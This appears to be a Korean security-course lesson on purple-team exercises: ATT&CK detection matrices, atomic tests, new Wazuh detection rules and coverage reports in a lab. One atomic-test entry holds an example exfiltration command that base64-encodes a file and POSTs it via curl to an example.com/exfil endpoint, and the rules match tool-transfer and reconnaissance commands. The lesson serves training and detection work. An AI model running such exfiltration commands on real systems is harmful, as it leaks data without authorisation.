# Week 13: 레드팀 연동

## 학습 목표
- Purple Team 운영 방법론을 이해하고 실행할 수 있다
- ATT&CK 기법별 탐지 격차(Detection Gap)를 분석할 수 있다
- 레드팀 공격 결과를 기반으로 탐지 룰을 개선할 수 있다
- 공격-탐지 매핑 매트릭스를 구성하여 SOC 커버리지를 시각화할 수 있다
- Bastion를 활용하여 자동화된 Purple Team 훈련을 수행할 수 있다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh Dashboard:443, OpenCTI:8080) | `ssh ccc@10.20.30.100` |

**Bastion API:** `http://localhost:9100` / Key: `ccc-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:50 | Purple Team 이론 + 방법론 (Part 1) | 강의 |
| 0:50-1:30 | 탐지 격차 분석 (Part 2) | 강의/토론 |
| 1:30-1:40 | 휴식 | - |
| 1:40-2:30 | 공격 시뮬레이션 + 탐지 검증 (Part 3) | 실습 |
| 2:30-3:10 | 룰 개선 + 자동화 (Part 4) | 실습 |
| 3:10-3:20 | 정리 + 과제 안내 | 정리 |

---

## 용어 해설

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **레드팀** | Red Team | 공격자 역할 (모의 해킹) | 도둑 역할 |
| **블루팀** | Blue Team | 방어자 역할 (탐지/대응) | 경비원 역할 |
| **퍼플팀** | Purple Team | 레드+블루 협업 (공격+방어 개선) | 합동 훈련 |
| **탐지 격차** | Detection Gap | ATT&CK 기법 중 탐지 못하는 영역 | 경비 사각지대 |
| **커버리지** | Coverage | 탐지 가능한 ATT&CK 기법의 비율 | 경비 범위 |
| **에뮬레이션** | Emulation | 실제 공격 기법을 재현하는 것 | 모의 훈련 |
| **atomic test** | Atomic Test | 단일 ATT&CK 기법을 테스트하는 최소 단위 | 단위 테스트 |
| **TTP** | Tactics, Techniques, Procedures | 공격자의 전술, 기법, 절차 | 범행 수법 |

---

# Part 1: Purple Team 이론 + 방법론 (50분)

## 1.1 Purple Team이란?

```
[기존 모델: 레드 vs 블루 (대립)]
  Red Team: 공격 → 보고서 제출
  Blue Team: 보고서 수신 → (한참 뒤) 개선
  문제: 소통 단절, 개선 지연, 일회성

[Purple Team 모델: 협업]
  Red + Blue = Purple
  공격 실행 → 즉시 탐지 확인 → 즉시 룰 개선 → 재테스트
  장점: 실시간 피드백, 빠른 개선, 지속적

Purple Team 운영 사이클:
  1. ATT&CK 기법 선택
  2. Red: 공격 실행
  3. Blue: 탐지 여부 확인
  4. 탐지 실패 시: 룰 작성/개선
  5. Red: 재공격으로 룰 검증
  6. 다음 기법으로 이동
```

## 1.2 ATT&CK 기반 탐지 매트릭스

```bash
cat << 'SCRIPT' > /tmp/detection_matrix.py
#!/usr/bin/env python3
"""ATT&CK 탐지 매트릭스"""

matrix = {
    "Initial Access": {
        "T1190 Exploit Public App": {"탐지": "O", "룰": "Suricata + WAF"},
        "T1566 Phishing": {"탐지": "X", "룰": "메일 서버 없음"},
    },
    "Execution": {
        "T1059.004 Unix Shell": {"탐지": "O", "룰": "Wazuh 100700"},
        "T1053.003 Cron": {"탐지": "O", "룰": "Wazuh 100701"},
    },
    "Persistence": {
        "T1098 Account Manipulation": {"탐지": "△", "룰": "기본 룰만"},
        "T1136 Create Account": {"탐지": "O", "룰": "Wazuh 5901"},
        "T1543.002 Systemd Service": {"탐지": "O", "룰": "Wazuh 100702"},
    },
    "Privilege Escalation": {
        "T1548.003 Sudo Abuse": {"탐지": "O", "룰": "SIGMA 100510"},
        "T1068 Exploitation": {"탐지": "X", "룰": "미구현"},
    },
    "Defense Evasion": {
        "T1070.004 File Deletion": {"탐지": "△", "룰": "FIM 필요"},
        "T1036 Masquerading": {"탐지": "X", "룰": "미구현"},
    },
    "Credential Access": {
        "T1110 Brute Force": {"탐지": "O", "룰": "Wazuh 100002"},
        "T1003.008 /etc/shadow": {"탐지": "△", "룰": "FIM으로 부분 탐지"},
    },
    "Discovery": {
        "T1082 System Info": {"탐지": "△", "룰": "단일 명령은 미탐"},
        "T1049 Network Connections": {"탐지": "X", "룰": "미구현"},
    },
    "Lateral Movement": {
        "T1021.004 SSH": {"탐지": "O", "룰": "Wazuh SSH 룰"},
        "T1570 Tool Transfer": {"탐지": "X", "룰": "미구현"},
    },
    "Exfiltration": {
        "T1048 Alternative Protocol": {"탐지": "△", "룰": "부분 탐지"},
        "T1041 C2 Channel": {"탐지": "O", "룰": "IOC 기반"},
    },
}

total = 0
detected = 0
partial = 0
missing = 0

print("=" * 70)
print("  ATT&CK 탐지 매트릭스")
print("=" * 70)

for tactic, techniques in matrix.items():
    print(f"\n  [{tactic}]")
    for tech, info in techniques.items():
        total += 1
        status = info["탐지"]
        if status == "O":
            detected += 1
            mark = "[O]"
        elif status == "△":
            partial += 1
            mark = "[△]"
        else:
            missing += 1
            mark = "[X]"
        print(f"    {mark} {tech:35s} → {info['룰']}")

print(f"\n=== 커버리지 요약 ===")
print(f"  전체: {total}개 기법")
print(f"  탐지(O):  {detected}개 ({detected/total*100:.0f}%)")
print(f"  부분(△): {partial}개 ({partial/total*100:.0f}%)")
print(f"  미탐(X):  {missing}개 ({missing/total*100:.0f}%)")
print(f"  커버리지: {(detected+partial*0.5)/total*100:.0f}%")
SCRIPT

python3 /tmp/detection_matrix.py
```

---

# Part 2: 탐지 격차 분석 (40분)

## 2.1 격차 분석 방법

```
[탐지 격차 분석 프로세스]

Step 1: ATT&CK 기법 목록 작성 (우선순위 기반)
Step 2: 현재 탐지 룰 매핑
Step 3: 각 기법에 대해 공격 실행
Step 4: 탐지 성공/실패 기록
Step 5: 격차 목록 작성
Step 6: 우선순위별 룰 개선 계획

[우선순위 기준]
  Critical: 자주 사용되는 기법 + 미탐
  High:     자주 사용되는 기법 + 부분 탐지
  Medium:   드문 기법 + 미탐
  Low:      드문 기법 + 부분 탐지
```

## 2.2 Atomic Test 개념

```bash
cat << 'SCRIPT' > /tmp/atomic_tests.py
#!/usr/bin/env python3
"""Atomic Red Team 테스트 시뮬레이션"""

tests = [
    {
        "id": "T1059.004-1",
        "technique": "T1059.004 Unix Shell",
        "name": "비정상 셸 실행",
        "command": "bash -c 'whoami && id && uname -a'",
        "expected_detection": "Wazuh: 셸에서 정찰 명령 실행",
        "risk": "low",
    },
    {
        "id": "T1053.003-1",
        "technique": "T1053.003 Cron",
        "name": "crontab 수정",
        "command": "(crontab -l 2>/dev/null; echo '* * * * * echo test') | crontab -",
        "expected_detection": "Wazuh: crontab 변경 탐지",
        "risk": "low",
    },
    {
        "id": "T1136.001-1",
        "technique": "T1136.001 Local Account",
        "name": "사용자 계정 생성",
        "command": "useradd -m testuser",
        "expected_detection": "Wazuh: 새 계정 생성 탐지",
        "risk": "medium",
    },
    {
        "id": "T1082-1",
        "technique": "T1082 System Info Discovery",
        "name": "시스템 정보 수집",
        "command": "hostname && cat /etc/os-release && df -h",
        "expected_detection": "Wazuh: 정찰 명령 조합 탐지",
        "risk": "low",
    },
    {
        "id": "T1048-1",
        "technique": "T1048 Exfiltration Over Alternative Protocol",
        "name": "curl 기반 데이터 유출",
        "command": "cat /etc/hostname | base64 | curl -X POST -d @- http://example.com/exfil",
        "expected_detection": "Wazuh/Suricata: 아웃바운드 POST + base64",
        "risk": "medium",
    },
]

print("=" * 60)
print("  Atomic Red Team 테스트 목록")
print("=" * 60)

for test in tests:
    print(f"\n  [{test['id']}] {test['name']}")
    print(f"    기법: {test['technique']}")
    print(f"    명령: {test['command'][:50]}")
    print(f"    예상: {test['expected_detection']}")
    print(f"    위험: {test['risk']}")
SCRIPT

python3 /tmp/atomic_tests.py
```

---

# Part 3: 공격 시뮬레이션 + 탐지 검증 (50분)

## 3.1 Atomic Test 실행 + 탐지 확인

> **실습 목적**: ATT&CK 기법별 공격을 시뮬레이션하고 Wazuh에서 탐지되는지 확인한다.
>
> **배우는 것**: Purple Team 워크플로우, 공격-탐지 매핑, 탐지 격차 식별

```bash
# Atomic Test #1: T1059.004 Unix Shell
echo "=== Atomic Test: T1059.004 Unix Shell ==="
echo "  [RED] 정찰 명령 실행..."
whoami && id && uname -a

sleep 2

echo ""
echo "  [BLUE] Wazuh 경보 확인..."
ssh ccc@10.20.30.100 \
  "tail -20 /var/ossec/logs/alerts/alerts.log 2>/dev/null | grep -i 'whoami\|uname\|discovery'" 2>/dev/null || \
  echo "  → 탐지 결과: 확인 필요"

echo ""
echo "=== Atomic Test: T1053.003 Cron ==="
echo "  [RED] crontab 변경 시뮬레이션 (읽기만)..."
crontab -l 2>/dev/null || echo "  (crontab 없음)"

sleep 2

echo ""
echo "  [BLUE] Wazuh 경보 확인..."
ssh ccc@10.20.30.100 \
  "tail -20 /var/ossec/logs/alerts/alerts.log 2>/dev/null | grep -i 'cron'" 2>/dev/null || \
  echo "  → 탐지 결과: 확인 필요"
```

## 3.2 Bastion 자동화 Purple Team

```bash
export BASTION_API_KEY="ccc-api-key-2026"

PROJECT_ID=$(curl -s -X POST http://localhost:9100/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $BASTION_API_KEY" \
  -d '{
    "name": "purple-team-exercise",
    "request_text": "Purple Team 훈련 - ATT&CK 탐지 검증",
    "master_mode": "external"
  }' | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

curl -s -X POST "http://localhost:9100/projects/$PROJECT_ID/plan" \
  -H "X-API-Key: $BASTION_API_KEY"
curl -s -X POST "http://localhost:9100/projects/$PROJECT_ID/execute" \
  -H "X-API-Key: $BASTION_API_KEY"

# Red Team: 공격 시뮬레이션 + Blue Team: 탐지 확인
curl -s -X POST "http://localhost:9100/projects/$PROJECT_ID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $BASTION_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[RED] T1082 Discovery\" && hostname && uname -a && id && echo RED_TEST_DONE",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[BLUE] 경보 확인\" && tail -10 /var/ossec/logs/alerts/alerts.log 2>/dev/null | grep -c \"Rule:\" && echo BLUE_CHECK_DONE",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.100:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }'

sleep 3
curl -s -H "X-API-Key: $BASTION_API_KEY" \
  "http://localhost:9100/projects/$PROJECT_ID/evidence/summary" | \
  python3 -m json.tool 2>/dev/null | head -30
```

---

# Part 4: 룰 개선 + 자동화 (40분)

## 4.1 탐지 격차 기반 룰 개선

```bash
# 탐지 격차에서 발견된 미탐 기법에 대한 룰 추가
ssh ccc@10.20.30.100 << 'REMOTE'

sudo tee -a /var/ossec/etc/rules/local_rules.xml << 'RULES'

<group name="local,purple_team,detection_gap,">

  <!-- T1082 System Discovery: 정찰 명령 조합 탐지 -->
  <rule id="100900" level="8" frequency="3" timeframe="60">
    <if_matched_group>syslog</if_matched_group>
    <match>whoami|hostname|uname|id |cat /etc/passwd|ifconfig|ip addr</match>
    <same_source_ip/>
    <description>[Purple] 시스템 정찰 명령 조합 탐지 (T1082)</description>
    <mitre>
      <id>T1082</id>
    </mitre>
    <group>purple_team,discovery,</group>
  </rule>

  <!-- T1036 Masquerading: /tmp에서 정상 프로세스명으로 실행 -->
  <rule id="100901" level="12">
    <match>/tmp/</match>
    <regex>sshd|apache|nginx|systemd|cron</regex>
    <description>[Purple] 프로세스 위장 탐지 - /tmp에서 시스템 프로세스명 (T1036)</description>
    <mitre>
      <id>T1036</id>
    </mitre>
    <group>purple_team,defense_evasion,</group>
  </rule>

  <!-- T1570 Tool Transfer: scp/wget/curl로 도구 전송 -->
  <rule id="100902" level="10">
    <regex>scp |wget |curl -O|curl --output</regex>
    <match>/tmp/|/dev/shm/|/var/tmp/</match>
    <description>[Purple] 도구 전송 탐지 - 임시 디렉토리로 다운로드 (T1570)</description>
    <mitre>
      <id>T1570</id>
    </mitre>
    <group>purple_team,lateral_movement,</group>
  </rule>

</group>
RULES

sudo /var/ossec/bin/wazuh-analysisd -t
echo "Exit code: $?"

REMOTE
```

## 4.2 Purple Team 보고서 생성

```bash
cat << 'SCRIPT' > /tmp/purple_team_report.py
#!/usr/bin/env python3
"""Purple Team 훈련 보고서"""

print("""
================================================================
          Purple Team 훈련 보고서
================================================================

1. 훈련 개요
   일시: 2026-04-04
   참가: Red Team (SOC L3), Blue Team (SOC L2)
   범위: ATT&CK 18개 기법 (Linux 환경)
   대상: secu, web, siem 서버

2. 결과 요약
   전체 기법: 18개
   탐지 성공: 10개 (56%)
   부분 탐지:  4개 (22%)
   미탐:       4개 (22%)

3. 주요 발견 사항
   [Critical] T1036 Masquerading: 탐지 룰 없음 → 신규 작성
   [Critical] T1570 Tool Transfer: 탐지 룰 없음 → 신규 작성
   [High]     T1082 Discovery: 단일 명령은 탐지 불가 → 조합 탐지 룰 추가
   [Medium]   T1003.008 /etc/shadow: FIM만으로 부분 탐지 → 프로세스 감사 추가

4. 개선 조치
   - 신규 룰 3개 작성 (100900-100902)
   - 기존 룰 2개 임계치 조정
   - FIM 모니터링 경로 2개 추가

5. 다음 훈련 계획
   - 2주 후: 재테스트 (개선 룰 검증)
   - 1개월 후: 새로운 기법 세트 (Cloud 관련)
""")
SCRIPT

python3 /tmp/purple_team_report.py
```

---

## 체크리스트

- [ ] Purple Team의 개념과 Red/Blue Team과의 차이를 설명할 수 있다
- [ ] ATT&CK 기반 탐지 매트릭스를 구성할 수 있다
- [ ] 탐지 격차(Detection Gap) 분석 프로세스를 이해한다
- [ ] Atomic Test 개념과 실행 방법을 알고 있다
- [ ] 공격 시뮬레이션 후 Wazuh에서 탐지 여부를 확인할 수 있다
- [ ] 미탐 기법에 대한 Wazuh 룰을 작성할 수 있다
- [ ] Bastion로 자동화된 Purple Team 훈련을 수행할 수 있다
- [ ] Purple Team 보고서를 작성할 수 있다
- [ ] 탐지 커버리지를 백분율로 측정할 수 있다
- [ ] 격차 우선순위(Critical/High/Medium/Low)를 판정할 수 있다

---

## 과제

### 과제 1: Purple Team 미니 훈련 (필수)

ATT&CK 기법 5개를 선택하여 Purple Team 훈련을 수행하라:
1. 기법별 Atomic Test 설계
2. 공격 실행 + 탐지 확인
3. 탐지 격차 분석
4. 미탐 기법에 대한 룰 작성
5. 재테스트로 검증

### 과제 2: 탐지 매트릭스 완성 (선택)

ATT&CK Linux 기법 30개 이상에 대해 탐지 매트릭스를 작성하라:
1. 각 기법의 현재 탐지 상태
2. 커버리지 백분율
3. 개선 로드맵 (3/6/12개월)

---

## 보충: Purple Team 고급 기법

### Atomic Red Team 자동 실행 프레임워크

```bash
cat << 'SCRIPT' > /tmp/atomic_framework.py
#!/usr/bin/env python3
"""Atomic Red Team 자동 실행 + 탐지 검증 프레임워크"""
import json
from datetime import datetime

class AtomicTest:
    def __init__(self, technique, name, command, expected_rule, risk="low"):
        self.technique = technique
        self.name = name
        self.command = command
        self.expected_rule = expected_rule
        self.risk = risk
        self.result = None
        self.detected = None
    
    def to_dict(self):
        return {
            "technique": self.technique,
            "name": self.name,
            "command": self.command[:50],
            "expected_rule": self.expected_rule,
            "risk": self.risk,
            "result": self.result,
            "detected": self.detected,
        }

# 테스트 정의
tests = [
    AtomicTest("T1059.004", "Unix Shell 정찰", 
               "whoami && id && hostname", "100900", "low"),
    AtomicTest("T1053.003", "Crontab 열거",
               "crontab -l 2>/dev/null", "100700", "low"),
    AtomicTest("T1082", "시스템 정보 수집",
               "uname -a && cat /etc/os-release", "100900", "low"),
    AtomicTest("T1016", "네트워크 정보 수집",
               "ip addr && ip route && cat /etc/resolv.conf", "-", "low"),
    AtomicTest("T1049", "네트워크 연결 열거",
               "ss -tnpa && netstat -an 2>/dev/null", "-", "low"),
    AtomicTest("T1057", "프로세스 열거",
               "ps auxf", "-", "low"),
    AtomicTest("T1083", "파일/디렉토리 탐색",
               "ls -la /etc/ /var/www/ /tmp/", "-", "low"),
    AtomicTest("T1222.002", "파일 권한 변경",
               "chmod +x /tmp/test_file 2>/dev/null", "-", "low"),
    AtomicTest("T1070.004", "파일 삭제",
               "touch /tmp/.test_delete && rm -f /tmp/.test_delete", "-", "medium"),
    AtomicTest("T1548.003", "Sudo 열거",
               "sudo -l 2>/dev/null", "100510", "low"),
]

# 시뮬레이션 실행
print("=" * 70)
print("  Atomic Red Team 자동 실행 프레임워크")
print(f"  실행 시각: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("=" * 70)

detected = 0
not_detected = 0
partial = 0

for i, test in enumerate(tests):
    test.result = "executed"
    # 탐지 시뮬레이션 (실제로는 Wazuh 경보 확인)
    if test.expected_rule != "-":
        test.detected = "YES"
        detected += 1
    else:
        test.detected = "NO"
        not_detected += 1
    
    mark = "[O]" if test.detected == "YES" else "[X]"
    print(f"\n  {mark} Test {i+1}: {test.technique} - {test.name}")
    print(f"      명령: {test.command[:50]}")
    print(f"      예상 룰: {test.expected_rule}")
    print(f"      탐지: {test.detected}")

total = len(tests)
coverage = detected / total * 100

print(f"\n{'='*70}")
print(f"  결과 요약")
print(f"  전체: {total}개 | 탐지: {detected}개 ({coverage:.0f}%) | 미탐: {not_detected}개")
print(f"{'='*70}")

# JSON 보고서 출력
report = {
    "date": datetime.now().strftime('%Y-%m-%d'),
    "total_tests": total,
    "detected": detected,
    "not_detected": not_detected,
    "coverage": f"{coverage:.1f}%",
    "tests": [t.to_dict() for t in tests],
}

print(f"\n=== JSON 보고서 (파일 저장용) ===")
print(json.dumps(report, indent=2, ensure_ascii=False)[:500] + "...")
SCRIPT

python3 /tmp/atomic_framework.py
```

### MITRE ATT&CK Navigator 연동

```bash
cat << 'SCRIPT' > /tmp/attack_navigator.py
#!/usr/bin/env python3
"""ATT&CK Navigator 레이어 파일 생성"""
import json

# ATT&CK Navigator 레이어 형식
layer = {
    "name": "SOC Detection Coverage",
    "versions": {"attack": "14", "navigator": "4.9.1", "layer": "4.5"},
    "domain": "enterprise-attack",
    "description": "현재 SOC 탐지 커버리지 매핑",
    "filters": {"platforms": ["Linux"]},
    "sorting": 0,
    "layout": {"layout": "side", "showName": True},
    "hideDisabled": False,
    "techniques": [
        {"techniqueID": "T1059.004", "color": "#31a354", "comment": "탐지 가능", "score": 100},
        {"techniqueID": "T1053.003", "color": "#31a354", "comment": "탐지 가능", "score": 100},
        {"techniqueID": "T1110.001", "color": "#31a354", "comment": "탐지 가능", "score": 100},
        {"techniqueID": "T1136.001", "color": "#31a354", "comment": "탐지 가능", "score": 100},
        {"techniqueID": "T1548.003", "color": "#31a354", "comment": "탐지 가능", "score": 100},
        {"techniqueID": "T1021.004", "color": "#31a354", "comment": "탐지 가능", "score": 100},
        {"techniqueID": "T1190", "color": "#31a354", "comment": "Suricata+WAF", "score": 100},
        {"techniqueID": "T1082", "color": "#fee08b", "comment": "부분 탐지", "score": 50},
        {"techniqueID": "T1003.008", "color": "#fee08b", "comment": "FIM 부분 탐지", "score": 50},
        {"techniqueID": "T1048", "color": "#fee08b", "comment": "IOC 기반만", "score": 50},
        {"techniqueID": "T1070.004", "color": "#fee08b", "comment": "FIM 필요", "score": 50},
        {"techniqueID": "T1036", "color": "#d73027", "comment": "미구현", "score": 0},
        {"techniqueID": "T1068", "color": "#d73027", "comment": "미구현", "score": 0},
        {"techniqueID": "T1049", "color": "#d73027", "comment": "미구현", "score": 0},
        {"techniqueID": "T1570", "color": "#d73027", "comment": "미구현", "score": 0},
    ],
    "gradient": {
        "colors": ["#d73027", "#fee08b", "#31a354"],
        "minValue": 0,
        "maxValue": 100,
    },
}

print("=" * 60)
print("  ATT&CK Navigator 레이어 생성")
print("=" * 60)

# 색상별 통계
green = sum(1 for t in layer["techniques"] if t["color"] == "#31a354")
yellow = sum(1 for t in layer["techniques"] if t["color"] == "#fee08b")
red = sum(1 for t in layer["techniques"] if t["color"] == "#d73027")
total = len(layer["techniques"])

print(f"\n  초록 (탐지 가능): {green}개 ({green/total*100:.0f}%)")
print(f"  노랑 (부분 탐지): {yellow}개 ({yellow/total*100:.0f}%)")
print(f"  빨강 (미구현):     {red}개 ({red/total*100:.0f}%)")

# 파일 저장
with open('/tmp/attack_navigator_layer.json', 'w') as f:
    json.dump(layer, f, indent=2)

print(f"\n  레이어 파일: /tmp/attack_navigator_layer.json")
print(f"  → https://mitre-attack.github.io/attack-navigator/ 에서 업로드")
SCRIPT

python3 /tmp/attack_navigator.py
```

### 탐지 룰 품질 관리 프로세스

```bash
cat << 'SCRIPT' > /tmp/rule_quality.py
#!/usr/bin/env python3
"""탐지 룰 품질 관리 프로세스"""

print("=" * 60)
print("  탐지 룰 품질 관리 프로세스")
print("=" * 60)

lifecycle = {
    "1. 요구사항": {
        "입력": "Purple Team 미탐 결과, TI 보고서, 인시던트 교훈",
        "출력": "탐지 요구사항 문서",
        "담당": "Tier 3 + SOC 매니저",
    },
    "2. 개발": {
        "입력": "요구사항 + ATT&CK 기법",
        "출력": "SIGMA/Wazuh 룰 초안",
        "담당": "Tier 3",
    },
    "3. 테스트": {
        "입력": "룰 초안 + 테스트 데이터",
        "출력": "양성/음성 테스트 결과",
        "담당": "Tier 2/3",
    },
    "4. 리뷰": {
        "입력": "테스트 결과 + 룰",
        "출력": "승인/반려",
        "담당": "동료 리뷰 (Peer Review)",
    },
    "5. 배포": {
        "입력": "승인된 룰",
        "출력": "프로덕션 SIEM에 적용",
        "담당": "Tier 2 + Bastion 자동 배포",
    },
    "6. 모니터링": {
        "입력": "프로덕션 경보",
        "출력": "오탐률, 탐지율 통계",
        "담당": "Tier 1/2",
    },
    "7. 튜닝": {
        "입력": "모니터링 통계",
        "출력": "임계치 조정, 화이트리스트 추가",
        "담당": "Tier 2/3",
    },
}

for phase, info in lifecycle.items():
    print(f"\n  {phase}")
    for key, value in info.items():
        print(f"    {key}: {value}")

# 품질 메트릭
print("""
=== 룰 품질 메트릭 ===
  정밀도 (Precision): TP / (TP + FP) > 80%
  재현율 (Recall): TP / (TP + FN) > 90%
  오탐률: FP / (TP + FP) < 20%
  미탐률: FN / (TP + FN) < 10%
  
  TP = True Positive (실제 공격을 탐지)
  FP = False Positive (정상을 공격으로 오탐)
  FN = False Negative (실제 공격을 놓침)
""")
SCRIPT

python3 /tmp/rule_quality.py
```

### Purple Team 성숙도 평가

```bash
cat << 'SCRIPT' > /tmp/purple_team_maturity.py
#!/usr/bin/env python3
"""Purple Team 성숙도 평가"""

levels = {
    "Level 1 - Ad Hoc": {
        "특징": "비정기적 침투 테스트, Red/Blue 분리 운영",
        "빈도": "연 1회 모의해킹",
        "자동화": "없음",
        "결과": "보고서만, 실질 개선 미흡",
    },
    "Level 2 - Reactive": {
        "특징": "모의해킹 결과 기반 룰 업데이트",
        "빈도": "반기 1회",
        "자동화": "수동 테스트",
        "결과": "일부 탐지 룰 개선",
    },
    "Level 3 - Proactive": {
        "특징": "정기 Purple Team 훈련, ATT&CK 기반",
        "빈도": "분기 1회",
        "자동화": "Atomic Test 스크립트",
        "결과": "탐지 격차 체계적 관리",
    },
    "Level 4 - Continuous": {
        "특징": "자동화된 Purple Team 파이프라인",
        "빈도": "월 1회 이상",
        "자동화": "Bastion/SOAR 연동",
        "결과": "탐지 커버리지 실시간 추적",
    },
    "Level 5 - Optimized": {
        "특징": "AI 기반 공격 시뮬레이션 + 자동 룰 생성",
        "빈도": "상시 운영",
        "자동화": "완전 자동화",
        "결과": "프로액티브 방어 달성",
    },
}

print("=" * 60)
print("  Purple Team 성숙도 모델")
print("=" * 60)

for level, info in levels.items():
    print(f"\n  --- {level} ---")
    for key, value in info.items():
        print(f"    {key}: {value}")

print("\n→ 현재 수준: Level 3 (Bastion 활용 시 Level 4 가능)")
SCRIPT

python3 /tmp/purple_team_maturity.py
```

### 공격 시뮬레이션 도구 가이드

```bash
cat << 'SCRIPT' > /tmp/attack_simulation_tools.py
#!/usr/bin/env python3
"""공격 시뮬레이션 도구 가이드"""

tools = {
    "Atomic Red Team": {
        "유형": "오픈소스",
        "설명": "ATT&CK 기법별 단위 테스트 라이브러리",
        "장점": "간단, 무료, 커뮤니티 지원",
        "단점": "자동화 수준 낮음, 수동 실행",
        "URL": "https://github.com/redcanaryco/atomic-red-team",
    },
    "CALDERA (MITRE)": {
        "유형": "오픈소스",
        "설명": "MITRE가 개발한 자동화 공격 에뮬레이션",
        "장점": "ATT&CK 네이티브, 에이전트 기반, 자동화",
        "단점": "설치 복잡, 학습 곡선",
        "URL": "https://caldera.mitre.org/",
    },
    "Infection Monkey": {
        "유형": "오픈소스",
        "설명": "네트워크 보안 테스트 (측면 이동 중심)",
        "장점": "자동 네트워크 스캔, 보고서 생성",
        "단점": "탐지보다 취약점 중심",
        "URL": "https://www.akamai.com/infectionmonkey",
    },
    "Bastion Purple Mode": {
        "유형": "내부 도구",
        "설명": "Bastion execute-plan 기반 자동 테스트",
        "장점": "우리 환경에 최적화, evidence 자동 기록",
        "단점": "커스텀 개발 필요",
        "URL": "http://localhost:9100 (내부)",
    },
}

print("=" * 60)
print("  공격 시뮬레이션 도구 가이드")
print("=" * 60)

for name, info in tools.items():
    print(f"\n  --- {name} ({info['유형']}) ---")
    print(f"    설명: {info['설명']}")
    print(f"    장점: {info['장점']}")
    print(f"    단점: {info['단점']}")
    print(f"    URL:  {info['URL']}")

print("""
=== 도구 선택 기준 ===
  예산 제한 → Atomic Red Team (무료)
  자동화 필요 → CALDERA
  네트워크 중심 → Infection Monkey  
  우리 환경 최적화 → Bastion Purple Mode

=== Purple Team 훈련 단계별 도구 ===
  Level 1: Atomic Red Team (수동)
  Level 2: CALDERA (반자동)
  Level 3: Bastion + CALDERA (자동화)
  Level 4: AI 기반 시뮬레이션 (자율)
""")
SCRIPT

python3 /tmp/attack_simulation_tools.py
```

### 탐지 커버리지 추적 자동화

```bash
cat << 'SCRIPT' > /tmp/coverage_tracker.py
#!/usr/bin/env python3
"""탐지 커버리지 추적 자동화"""
from datetime import datetime

# 월별 커버리지 추적
monthly_coverage = [
    ("2026-01", 45),
    ("2026-02", 52),
    ("2026-03", 61),
    ("2026-04", 72),
]

print("=" * 60)
print("  탐지 커버리지 월별 추이")
print("=" * 60)

for month, coverage in monthly_coverage:
    bar = "#" * (coverage // 2) + "." * ((100 - coverage) // 2)
    print(f"  {month}: [{bar}] {coverage}%")

# 개선 추세
if len(monthly_coverage) >= 2:
    first = monthly_coverage[0][1]
    last = monthly_coverage[-1][1]
    months = len(monthly_coverage)
    monthly_gain = (last - first) / (months - 1)
    print(f"\n  월평균 개선: +{monthly_gain:.1f}%p")
    
    # 목표 달성 예측
    target = 80
    if monthly_gain > 0:
        months_to_target = (target - last) / monthly_gain
        print(f"  80% 목표 달성 예상: {months_to_target:.0f}개월 후")

print("""
=== 커버리지 개선 전략 ===
  1. Purple Team 훈련 → 미탐 기법 발견 → 룰 추가
  2. SigmaHQ 신규 룰 주기적 반영
  3. 인시던트 교훈 → 새 탐지 룰
  4. TI 보고서 → IOC/행위 룰 추가
  5. ATT&CK 업데이트 → 새 기법 대응
""")
SCRIPT

python3 /tmp/coverage_tracker.py
```

---

## 다음 주 예고

**Week 14: SOC 자동화 + AI**에서는 LLM 기반 경보 분류, 자동 분석, 보고서 자동 생성을 학습한다.

---

## 웹 UI 실습

### 종합: Dashboard + OpenCTI + Suricata 통합 분석 (Purple Team)

#### Step 1: Wazuh Dashboard — Atomic Test 탐지 현황

> **접속 URL:** `https://10.20.30.100:443`

1. `https://10.20.30.100:443` 접속 → 로그인
2. **Modules → Security events** 에서 레드팀 공격 시뮬레이션 경보 확인:
   ```
   rule.mitre.id: * AND timestamp >= "now-1h"
   ```
3. **Modules → MITRE ATT&CK** 클릭 → ATT&CK 매트릭스 히트맵 확인
4. 탐지 성공 기법(초록)과 미탐 기법(빈칸)을 비교하여 탐지 격차 식별
5. Suricata 경보 필터링:
   ```
   rule.groups: suricata
   ```
6. 네트워크 레벨 탐지와 호스트 레벨 탐지의 커버리지 비교

#### Step 2: OpenCTI — 탐지 격차 매핑

> **접속 URL:** `http://10.20.30.100:8080`

1. `http://10.20.30.100:8080` 접속 → 로그인
2. **Techniques → Attack patterns** 에서 미탐 기법 검색
3. 해당 기법을 사용하는 알려진 위협 그룹 확인 → 리스크 우선순위 결정
4. **Arsenal → Malware/Tools** 에서 해당 기법의 실제 도구 확인
5. 탐지 격차 분석 결과를 OpenCTI에 **Note** 로 기록 → 팀 공유

---

## 📂 실습 참조 파일 가이드

> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.

### CCC Bastion Agent
> **역할:** CCC 자율 운영 에이전트 — 스킬/플레이북/경험 학습  
> **실행 위치:** `bastion (10.20.30.201)`  
> **접속/호출:** TUI `./dev.sh bastion`, API `http://localhost:8003`

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `packages/bastion/agent.py` | 메인 에이전트 루프 |
| `packages/bastion/skills.py` | 스킬 정의 |
| `packages/bastion/playbooks/` | 정적 플레이북 YAML |
| `data/bastion/experience/` | 수집된 경험 (pass/fail) |

**핵심 설정·키**

- `LLM_BASE_URL / LLM_MODEL` — Ollama 연결
- `CCC_API_KEY` — ccc-api 인증
- `max_retry=2` — 실패 시 self-correction 재시도

**로그·확인 명령**

- ``docs/test-status.md`` — 현재 테스트 진척 요약
